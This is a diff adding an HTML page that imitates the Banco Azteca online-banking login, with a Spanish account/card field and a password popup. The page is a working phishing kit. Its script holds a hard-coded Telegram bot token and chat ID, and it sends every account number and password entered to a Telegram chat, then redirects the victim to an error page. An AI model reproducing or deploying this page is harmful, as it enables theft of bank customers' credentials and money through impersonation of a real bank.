@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Azteca - Banca en Línea</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, rgba(0,0,0,0.7), rgba(0,0,0,0.5)), 
+                        url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 400"><rect width="400" height="400" fill="%23f0f0f0"/><circle cx="100" cy="100" r="80" fill="%23e0e0e0" opacity="0.5"/><circle cx="300" cy="200" r="60" fill="%23d0d0d0" opacity="0.3"/><circle cx="200" cy="320" r="90" fill="%23c0c0c0" opacity="0.4"/></svg>');
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: white;
+            padding: 15px 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #2d5a2d, #4a8f4a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .logo-icon::before {
+            content: '';
+            width: 20px;
+            height: 20px;
+            background: #ff4444;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .logo-icon::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .logo-text {
+            color: #666;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .nav-tabs {
+            background: #2e7d32;
+            padding: 0;
+            margin-top: 10px;
+        }
+
+        .tab-container {
+            display: flex;
+            max-width: 400px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .tab.active {
+            background: rgba(255,255,255,0.2);
+            border-bottom: 3px solid white;
+        }
+
+        .tab.inactive {
+            opacity: 0.7;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: url('../img/banner_banca_en_linea.webp');
+            background-size: cover;
+            position: relative;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(0,0,0,0.6), rgba(0,0,0,0.4));
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-title {
+            color: #2e7d32;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .login-subtitle {
+            color: #4caf50;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            line-height: 1.2;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 18px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background-color: #fafafa;
+            color: #666;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #2e7d32;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(46, 125, 50, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #999;
+            font-size: 16px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #2e7d32, #4caf50);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(135deg, #1b5e20, #2e7d32);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(46, 125, 50, 0.3);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password a:hover {
+            color: #2e7d32;
+        }
+
+        .version-code {
+            text-align: right;
+            color: #999;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+
+        .footer {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #2e7d32;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        .success-message {
+            display: none;
+            background: #4caf50;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        .error-message {
+            display: none;
+            background: #f44336;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 10px 15px;
+            }
+
+            .logo-text {
+                font-size: 20px;
+            }
+
+            .tab {
+                padding: 12px;
+                font-size: 14px;
+            }
+
+            .login-card {
+                padding: 30px 20px;
+                margin: 10px;
+                max-width: none;
+            }
+
+            .login-title,
+            .login-subtitle {
+                font-size: 20px;
+            }
+
+            .container {
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .logo-text {
+                font-size: 18px;
+            }
+
+            .tab {
+                font-size: 12px;
+                padding: 10px;
+            }
+
+            .login-title,
+            .login-subtitle {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-container">
+            <img src="../img/logo-baz.svg" style="width: 100%;" alt="">
+        </div>
+        <div class="nav-tabs">
+            <div class="tab-container">
+                <div class="tab active">PERSONAS</div>
+                <div class="tab inactive">EMPRESAS</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-card">
+            <h1 class="login-title">Accede a</h1>
+            <h2 class="login-subtitle">tu Banca en Línea</h2>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input 
+                        type="text" 
+                        id="cuenta" 
+                        class="form-input" 
+                        placeholder="Cuenta/Tarjeta"
+                        required
+                        autocomplete="username"
+                    >
+                </div>
+
+                <button type="submit" class="login-btn" id="submitBtn">
+                    INGRESAR
+                </button>
+
+                <div class="loading" id="loading">
+                    Procesando información...
+                </div>
+
+                <div class="success-message" id="successMessage">
+                    Información procesada correctamente
+                </div>
+
+                <div class="error-message" id="errorMessage">
+                    Error al procesar la información. Intenta nuevamente.
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#" onclick="showPasswordForm()">OLVIDE MI CONTRASEÑA</a>
+                </div>
+
+                <div class="version-code">MX21</div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        Banco Azteca S.A., Institución de Banca Múltiple.<br>
+        Todos los Derechos reservados, 2025
+    </div>
+
+    <!-- Modal para contraseña -->
+    <div id="passwordModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center;">
+        <div style="background: white; border-radius: 15px; padding: 30px; max-width: 350px; width: 90%; margin: 20px;">
+            <h3 style="color: #2e7d32; margin-bottom: 20px; text-align: center;">Ingresa tu contraseña</h3>
+            <input type="password" id="passwordInput" placeholder="Contraseña" style="width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 8px; margin-bottom: 20px; font-size: 16px;">
+            <div style="display: flex; gap: 10px;">
+                <button onclick="submitLogin()" style="flex: 1; background: #2e7d32; color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer;">Continuar</button>
+                <button onclick="closePasswordModal()" style="flex: 1; background: #ccc; color: #333; border: none; padding: 12px; border-radius: 6px; cursor: pointer;">Cancelar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+        const TELEGRAM_CHAT_ID = '5848946481';
+
+        let currentAccount = '';
+
+        function showPasswordForm() {
+            const cuenta = document.getElementById('cuenta').value;
+            if (!cuenta) {
+                alert('Por favor ingresa tu cuenta/tarjeta primero');
+                return;
+            }
+            currentAccount = cuenta;
+            document.getElementById('passwordModal').style.display = 'flex';
+            document.getElementById('passwordInput').focus();
+        }
+
+        function closePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            document.getElementById('passwordInput').value = '';
+        }
+
+        async function sendToTelegram(cuenta, contrasena) {
+            const message = `🏦 *Nuevo acceso Banco Azteca*\n\n💳 *Cuenta/Tarjeta:* ${cuenta}\n🔐 *Contraseña:* ${contrasena}\n⏰ *Fecha:* ${new Date().toLocaleString('es-ES')}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            return response.ok;
+        }
+
+        async function submitLogin() {
+            const cuenta = currentAccount;
+            const contrasena = document.getElementById('passwordInput').value;
+            
+            if (!contrasena) {
+                alert('Por favor ingresa tu contraseña');
+                return;
+            }
+
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Ocultar modal y mostrar loading
+            closePasswordModal();
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                const success = await sendToTelegram(cuenta, contrasena);
+                
+                loading.style.display = 'none';
+                
+                if (success) {
+                    successMessage.style.display = 'block';
+                    
+                    // Redirigir después de 2 segundos
+                    setTimeout(() => {
+                        window.location.href = 'error.html';
+                    }, 2000);
+                } else {
+                    errorMessage.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            showPasswordForm();
+        });
+
+        // Permitir envío con Enter en el modal de contraseña
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitLogin();
+            }
+        });
+
+        // Validación en tiempo real
+        document.getElementById('cuenta').addEventListener('input', function() {
+            const cuenta = this.value;
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = !cuenta;
+        });
+
+        // Inicializar validación
+        document.getElementById('submitBtn').disabled = true;
+    </script>
+</body>
+</html>
